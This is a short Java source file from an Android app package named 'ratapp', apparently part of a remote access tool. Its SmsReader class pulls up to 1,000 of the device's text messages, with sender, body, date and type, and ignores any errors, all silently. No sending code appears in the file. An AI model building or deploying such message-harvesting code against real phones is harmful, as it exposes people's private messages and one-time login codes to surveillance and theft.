package com.ratio.ratapp;

import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SmsReader {
    public static List<Map<String, Object>> read(Context ctx) {
        List<Map<String, Object>> out = new ArrayList<>();
        Cursor c = null;
        try {
            c = ctx.getContentResolver().query(
                Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
            if (c != null) {
                int max = 1000;
                while (c.moveToNext() && out.size() < max) {
                    Map<String, Object> e = new HashMap<>();
                    e.put("address", s(c, Telephony.Sms.ADDRESS));
                    e.put("body",    s(c, Telephony.Sms.BODY));
                    e.put("date",    s(c, Telephony.Sms.DATE));
                    e.put("type",    s(c, Telephony.Sms.TYPE));
                    out.add(e);
                }
            }
        } catch (Exception ignored) {
        } finally {
            if (c != null) c.close();
        }
        return out;
    }

    private static String s(Cursor c, String col) {
        int i = c.getColumnIndex(col);
        return i < 0 ? "" : String.valueOf(c.getString(i));
    }
}
